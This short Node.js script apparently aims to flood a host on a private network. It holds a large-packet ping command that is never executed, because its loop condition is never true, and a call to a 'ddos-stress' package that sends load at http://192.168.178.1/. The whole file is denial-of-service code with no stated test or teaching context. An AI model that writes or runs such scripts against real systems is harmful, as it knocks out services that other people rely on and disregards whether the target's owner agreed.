var command = "ping 192.168.178.1 -l 65000";


const { exec } = require('child_process');



for(var i = 0; i < 0; i++){
    exec(command, (err, stdout, stderr) => {
        console.log(err);
        console.log(stdout);
        console.log(stderr);
    });
}

var Stress = require('ddos-stress');
 
// Create new instance of DDoS Stress
var stress = new Stress();
 
// Run stress on server
stress.run('http://192.168.178.1/',100);


